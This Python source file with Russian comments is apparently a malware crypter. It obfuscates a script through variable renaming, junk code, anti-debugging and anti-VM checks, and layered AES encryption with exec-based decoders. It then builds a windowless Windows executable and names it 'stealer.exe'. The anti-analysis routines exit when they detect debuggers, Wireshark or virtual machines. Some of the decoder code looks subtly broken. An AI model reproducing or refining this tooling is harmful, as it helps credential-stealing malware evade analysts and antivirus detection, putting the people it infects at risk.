import base64
import random
import string
import re
import os
import zlib
import hashlib
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import ast
import marshal
import uuid

# Генерация случайных значений
def generate_random_var(min_length=5, max_length=15):
    """Генерирует случайное имя переменной"""
    length = random.randint(min_length, max_length)
    first_char = random.choice(string.ascii_letters)
    rest_chars = ''.join(random.choice(string.ascii_letters + string.digits + '_') for _ in range(length - 1))
    return first_char + rest_chars

def generate_random_string(length=32):
    """Генерирует случайную строку заданной длины"""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_key():
    """Генерирует криптографический ключ"""
    return os.urandom(32)  # 256 bit key

def generate_iv():
    """Генерирует вектор инициализации"""
    return os.urandom(16)  # 128 bit IV

# Утилиты для манипуляций со строками
def split_string(s, chunk_size=5):
    """Разбивает строку на части заданного размера"""
    return [s[i:i + chunk_size] for i in range(0, len(s), chunk_size)]

# Продвинутые методы обфускации
def rename_variables(source_code):
    """Переименовывает переменные, аргументы функций и имена функций"""
    tree = ast.parse(source_code)
    
    # Словари для отслеживания переименований
    variables_dict = {}
    functions_dict = {}
    
    # Определяем список зарезервированных имен Python
    reserved_keywords = set([
        'False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break',
        'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for',
        'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or',
        'pass', 'raise', 'return', 'try', 'while', 'with', 'yield', 'match', 'case',
        'print', 'open', 'file', 'exec', 'eval', 'compile', 'object', 'str', 'int',
        'float', 'list', 'dict', 'tuple', 'set', 'bool', 'bytes', 'isinstance', 'type',
        'len', 'range', 'enumerate', 'zip', 'map', 'filter', 'sum', 'min', 'max',
        'sorted', 'reversed', 'round', 'abs', 'pow', 'divmod', 'hex', 'oct', 'bin',
        'id', 'hash', 'getattr', 'setattr', 'delattr', 'hasattr', 'callable', 'super',
        'property', 'staticmethod', 'classmethod', 'next', 'iter', 'all', 'any', 'dir',
        '__init__', '__name__', '__main__', '__file__', '__dict__', '__doc__', '__class__',
        '__bases__', '__mro__', '__subclasses__', '__module__'
    ])
    
    # Классы для обхода AST и переименования переменных
    class VariableRenamer(ast.NodeTransformer):
        def visit_Name(self, node):
            if isinstance(node.ctx, ast.Load) and node.id not in reserved_keywords:
                if node.id in variables_dict:
                    node.id = variables_dict[node.id]
            return node
            
        def visit_FunctionDef(self, node):
            # Переименовываем имя функции, если оно не в зарезервированных
            if node.name not in reserved_keywords:
                if node.name not in functions_dict:
                    functions_dict[node.name] = generate_random_var()
                node.name = functions_dict[node.name]
            
            # Переименовываем аргументы функции
            for arg in node.args.args:
                if arg.arg not in reserved_keywords:
                    if arg.arg not in variables_dict:
                        variables_dict[arg.arg] = generate_random_var()
                    arg.arg = variables_dict[arg.arg]
            
            # Рекурсивно обрабатываем тело функции
            self.generic_visit(node)
            return node
            
        def visit_Assign(self, node):
            # Переименовываем переменные в присваиваниях
            for target in node.targets:
                if isinstance(target, ast.Name) and target.id not in reserved_keywords:
                    if target.id not in variables_dict:
                        variables_dict[target.id] = generate_random_var()
            
            self.generic_visit(node)
            return node
    
    # Применяем трансформацию
    tree = VariableRenamer().visit(tree)
    # Исправляем позиции узлов в AST
    ast.fix_missing_locations(tree)
    
    # Конвертируем обратно в код
    return ast.unparse(tree)

def add_junk_code(source_code):
    """Добавляет мусорный код для затруднения анализа"""
    # Генерируем мусорные переменные и операции
    junk_vars = [generate_random_var() for _ in range(random.randint(5, 15))]
    junk_code = []
    
    for var in junk_vars:
        # Случайно выбираем тип мусорной операции
        op_type = random.randint(1, 5)
        
        if op_type == 1:
            # Присваивание случайного значения
            value = random.choice([
                f'"{generate_random_string(random.randint(10, 30))}"',
                str(random.randint(0, 10000)),
                f'{random.random()}',
                f'[{", ".join([str(random.randint(0, 100)) for _ in range(random.randint(1, 5))])}]',
                '{' + ", ".join([f"'key{i}': '{generate_random_string(5)}'" for i in range(random.randint(1, 3))]) + '}',
                f'({", ".join([str(random.randint(0, 100)) for _ in range(random.randint(1, 5))])})',
            ])
            junk_code.append(f"{var} = {value}")
        
        elif op_type == 2:
            # Условный оператор, который никогда не выполнится
            condition = random.choice([
                "False",
                "0 == 1",
                "1 > 2",
                f"len('{generate_random_string(3)}') > 10",
                f"'{generate_random_string(5)}' == '{generate_random_string(5)}'",
            ])
            
            action = random.choice([
                f"print('{generate_random_string(10)}')",
                f"{var} = {random.randint(0, 100)}",
                "pass",
                f"raise Exception('{generate_random_string(10)}')",
            ])
            
            junk_code.append(f"if {condition}:\n    {action}")
        
        elif op_type == 3:
            # Бесполезный цикл
            count = random.randint(1, 5)
            body = random.choice([
                "pass",
                f"{var} += 1",
                f"{var} *= 2",
                f"{var} = '{generate_random_string(5)}'",
            ])
            
            junk_code.append(f"for _ in range(0):\n    {body}")
        
        elif op_type == 4:
            # Бесполезная функция
            func_name = generate_random_var()
            args = ', '.join([generate_random_var() for _ in range(random.randint(0, 3))])
            
            body = random.choice([
                "pass",
                f"return '{generate_random_string(10)}'",
                f"return {random.randint(0, 100)}",
                f"return None",
            ])
            
            junk_code.append(f"def {func_name}({args}):\n    {body}")
        
        elif op_type == 5:
            # Бесполезное исключение
            exc_type = random.choice(['Exception', 'ValueError', 'TypeError', 'RuntimeError'])
            
            junk_code.append(f"""try:
    if {random.random()} < 0:
        raise {exc_type}('{generate_random_string(10)}')
except {exc_type}:
    pass""")
    
    # Добавляем мусорный код в случайные места в исходный код
    lines = source_code.split('\n')
    for junk in junk_code:
        pos = random.randint(0, len(lines))
        lines.insert(pos, junk)
    
    return '\n'.join(lines)

def add_anti_debug(source_code):
    """Добавляет код обнаружения отладки"""
    anti_debug_code = """
# Анти-отладка
import sys
import time
import os
import platform
import ctypes
import traceback

def check_debugger():
    try:
        # Проверка временных интервалов (отладчик замедляет выполнение)
        t1 = time.time()
        for _ in range(1000):
            pass
        t2 = time.time()
        if t2 - t1 > 0.01:  # Слишком долгое выполнение цикла
            os._exit(1)
        
        # Проверка наличия распространенных процессов отладчиков
        if platform.system() == "Windows":
            import subprocess
            processes = subprocess.check_output('tasklist', shell=True).decode().lower()
            debuggers = ['ollydbg', 'ida', 'ida64', 'immunity', 'x32dbg', 'x64dbg', 'cheatengine', 'wireshark']
            if any(dbg in processes for dbg in debuggers):
                os._exit(1)
        
        # Проверка наличия точек останова с помощью API Windows
        if platform.system() == "Windows":
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent() != 0:
                os._exit(1)
            
            # Еще один метод проверки отладчика 
            debug_value = ctypes.c_long()
            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(debug_value))
            if debug_value.value != 0:
                os._exit(1)
        
        # Проверка на виртуальные машины
        vm_indicators = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
        computer_name = platform.node().lower()
        for indicator in vm_indicators:
            if indicator in computer_name:
                os._exit(1)
        
        # Проверка parent process
        if platform.system() == "Windows":
            try:
                import psutil
                parent = psutil.Process(os.getpid()).parent()
                if parent and parent.name().lower() in ['ida', 'ida64', 'x32dbg', 'x64dbg', 'ollydbg', 'cheatengine']:
                    os._exit(1)
            except:
                pass
    except:
        pass

# Запуск проверки отладки
check_debugger()
"""
    
    # Добавляем код анти-отладки в начало файла
    return anti_debug_code + '\n' + source_code

def encrypt_code(code, key=None, iv=None):
    """Шифрует код с использованием AES"""
    if key is None:
        key = generate_key()
    if iv is None:
        iv = generate_iv()
    
    # Добавляем случайные байты в конец для дополнительной защиты
    code += "\n# " + generate_random_string(random.randint(10, 100))
    
    # Создаем шифратор AES
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    
    # Применяем выравнивание
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(code.encode('utf-8')) + padder.finalize()
    
    # Шифруем данные
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
    # Возвращаем зашифрованный код и ключи
    return ciphertext, key, iv

def create_decrypt_stub(encrypted_code, key, iv, layer_count=3):
    """Создает многослойный декодер для зашифрованного кода"""
    # Базовый декодер
    decoder_template = """
# Обфусцированный код
import base64
import zlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import sys
import os
import time
import marshal
import random
import builtins
import importlib

# Проверка времени выполнения для обнаружения отладки
_t1 = time.time()
_offset = random.randint(10, 50)
_t2 = time.time()
if _t2 - _t1 > 0.1:
    sys.exit(0)

# Функция декодирования
def _decode():
    try:
        # Зашифрованные данные
        _encrypted = {encrypted}
        _key = {key}
        _iv = {iv}
        
        # Расшифровка
        _backend = default_backend()
        _cipher = Cipher(algorithms.AES(_key), modes.CBC(_iv), backend=_backend)
        _decryptor = _cipher.decryptor()
        _decrypted_padded = _decryptor.update(_encrypted) + _decryptor.finalize()
        
        # Удаление выравнивания
        _unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        _decrypted = _unpadder.update(_decrypted_padded) + _unpadder.finalize()
        
        return _decrypted.decode('utf-8')
    except Exception as e:
        # В случае ошибки расшифровки (возможно из-за отладчика) выходим
        sys.exit(0)

# Защита от модификации
_original_import = builtins.__import__
def _protected_import(name, *args, **kwargs):
    if name in ['sys', 'os', 'traceback', 'inspect']:
        # Проверяем стек вызовов
        import traceback
        stack = traceback.extract_stack()
        for frame in stack:
            # Если вызов из подозрительного источника - выходим
            if 'debug' in frame.name.lower() or 'trace' in frame.name.lower():
                sys.exit(0)
    return _original_import(name, *args, **kwargs)

# Подменяем функцию импорта
builtins.__import__ = _protected_import

# Извлекаем и выполняем код
_code = _decode()
try:
    # Проверка на работу в песочнице
    if time.time() - _t1 < 0.001:
        sys.exit(0)  # Слишком быстро для реального выполнения
    
    # Выполняем код
    exec(_code)
except Exception as _e:
    # Тихое завершение при ошибках
    pass
"""
    
    # Преобразуем бинарные данные в строковое представление для вставки в код
    encrypted_str = repr(base64.b85encode(encrypted_code))
    key_str = repr(base64.b85encode(key))
    iv_str = repr(base64.b85encode(iv))
    
    # Заполняем шаблон
    decoder = decoder_template.format(
        encrypted=encrypted_str,
        key=key_str,
        iv=iv_str
    )
    
    # Многослойная защита
    for _ in range(layer_count - 1):
        # Сжимаем и кодируем предыдущий слой
        compressed = zlib.compress(decoder.encode('utf-8'), level=9)
        encoded = base64.b85encode(compressed)
        
        # Генерируем ключи для этого слоя
        layer_key = generate_key()
        layer_iv = generate_iv()
        
        # Шифруем этот слой
        backend = default_backend()
        cipher = Cipher(algorithms.AES(layer_key), modes.CBC(layer_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        # Применяем выравнивание
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(encoded) + padder.finalize()
        
        # Шифруем данные
        layer_encrypted = encryptor.update(padded_data) + encryptor.finalize()
        
        # Создаем новый декодер для этого слоя
        decoder = f"""
# Обфусцированный код - слой {_}
import base64
import zlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import sys
import time
import random

# Проверка отладки по времени
_t1 = time.time()
for _ in range(random.randint(1000, 5000)):
    pass
_t2 = time.time()
if _t2 - _t1 > 0.05:
    sys.exit(0)

# Декодирование слоя
_encrypted = {repr(base64.b85encode(layer_encrypted))}
_key = {repr(base64.b85encode(layer_key))}
_iv = {repr(base64.b85encode(layer_iv))}

# Расшифровка
_backend = default_backend()
_cipher = Cipher(algorithms.AES(base64.b85decode(_key)), modes.CBC(base64.b85decode(_iv)), backend=_backend)
_decryptor = _cipher.decryptor()
_decrypted_padded = _decryptor.update(base64.b85decode(_encrypted)) + _decryptor.finalize()

# Удаление выравнивания
_unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
try:
    _decrypted = _unpadder.update(_decrypted_padded) + _unpadder.finalize()
    _decompressed = zlib.decompress(base64.b85decode(_decrypted))
    exec(_decompressed.decode('utf-8'))
except Exception as e:
    sys.exit(0)
"""
    
    return decoder

def advanced_obfuscate(code):
    """Применяет продвинутую обфускацию к коду"""
    # Шаг 1: Переименование переменных
    try:
        code = rename_variables(code)
    except Exception as e:
        print(f"Ошибка при переименовании переменных: {e}")
        # Если не удалось переименовать переменные, используем базовую обфускацию
        code = basic_obfuscation(code)
    
    # Шаг 2: Добавление мусорного кода
    code = add_junk_code(code)
    
    # Шаг 3: Добавление защиты от отладки
    code = add_anti_debug(code)
    
    # Шаг 4: Шифрование кода
    encrypted_code, key, iv = encrypt_code(code)
    
    # Шаг 5: Создание декодера
    final_code = create_decrypt_stub(encrypted_code, key, iv)
    
    return final_code

def basic_obfuscation(code):
    """Базовая обфускация с переименованием переменных"""
    # Найти все имена переменных
    variable_pattern = r'\b[a-zA-Z_][a-zA-Z0-9_]*\b'
    blacklist = set(['import', 'from', 'as', 'try', 'except', 'finally', 'for', 'while', 
                    'if', 'elif', 'else', 'def', 'class', 'return', 'True', 'False', 'None',
                    'print', 'open', 'with', 'os', 'sys', 'requests', 'json', 'time', 'random',
                    'in', 'is', 'not', 'and', 'or', 'break', 'continue', 'pass', 'lambda',
                    'global', 'nonlocal', 'del', 'raise', 'assert', 'yield'])
    
    variables = set(re.findall(variable_pattern, code))
    variables = variables - blacklist
    
    variable_mapping = {var: generate_random_var() for var in variables}
    
    for old_var, new_var in variable_mapping.items():
        # Заменить только полные слова
        pattern = r'\b' + re.escape(old_var) + r'\b'
        code = re.sub(pattern, new_var, code)
    
    return code

def compress_and_encode(data):
    """Сжимает и кодирует данные"""
    compressed = zlib.compress(data.encode(), level=9)  # Максимальный уровень сжатия
    encoded = base64.b85encode(compressed)  # Base85 более компактен, чем Base64
    return encoded

def obfuscate(filename, output_filename=None):
    """Обфускация Python кода"""
    if not output_filename:
        base, ext = os.path.splitext(filename)
        output_filename = f"{base}_obfuscated{ext}"
    
    with open(filename, 'r', encoding='utf-8') as f:
        content = f.read()
    
    try:
        # Продвинутая обфускация
        obfuscated_content = advanced_obfuscate(content)
    except Exception as e:
        print(f"Ошибка продвинутой обфускации: {e}")
        print("Возвращаемся к базовой обфускации...")
        # Применяем базовую обфускацию
        obfuscated_content = basic_obfuscation(content)
        
        # Сжимаем и кодируем содержимое
        encoded_content = compress_and_encode(obfuscated_content)
        
        # Генерация скрипта декодера (базовый вариант)
        obfuscated_content = f"""
import base64
import zlib
import random
import string
import builtins
import sys
import time

_run = getattr(builtins, '__import__')
_sys = _run('sys')
_os = _run('os')
_types = _run('types')

def _get_code():
    encoded = {encoded_content}
    compressed = base64.b85decode(encoded)
    return zlib.decompress(compressed).decode()

# Проверка времени исполнения
_t1 = time.time()
_code = _get_code()
_t2 = time.time()

# Если декодирование заняло слишком много времени (возможно отладка), выходим
if _t2 - _t1 > 0.1:
    sys.exit(0)

exec(_code)
"""
    
    # Запись в файл
    with open(output_filename, 'w', encoding='utf-8') as f:
        f.write(obfuscated_content)
    
    print(f"Обфускация завершена. Результат сохранен в {output_filename}")
    return output_filename

def obfuscate_to_exe(filename, icon_path=None, console=False):
    """Конвертирует Python файл в исполняемый файл Windows с обфускацией"""
    import PyInstaller.__main__
    
    # Сначала делаем обфускацию
    obfuscated_file = obfuscate(filename)
    
    # Генерируем случайное имя для файла
    random_name = generate_random_var(8, 12)
    
    # Подготовка аргументов для PyInstaller
    args = ['--onefile', f'--name={random_name}']
    
    if not console:
        args.append('--noconsole')
    
    if icon_path and os.path.exists(icon_path):
        args.extend(['--icon', icon_path])
    
    # Добавляем --clean для очистки временных файлов
    args.append('--clean')
    
    # Настройки для усложнения обратной инженерии
    args.append('--key=' + generate_random_string(32))
    
    # Добавляем обфусцированный файл в конце
    args.append(obfuscated_file)
    
    # Запуск PyInstaller
    PyInstaller.__main__.run(args)
    
    # Переименовываем файл в dist директории
    try:
        os.rename(
            os.path.join('dist', f'{random_name}.exe'),
            os.path.join('dist', 'stealer.exe')
        )
        print(f"Исполняемый файл переименован в stealer.exe")
    except:
        pass
    
    # Удаляем временный обфусцированный файл
    try:
        os.remove(obfuscated_file)
    except:
        pass
    
    print(f"Сборка завершена. Исполняемый файл находится в папке dist/")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        filename = sys.argv[1]
        obfuscate(filename)
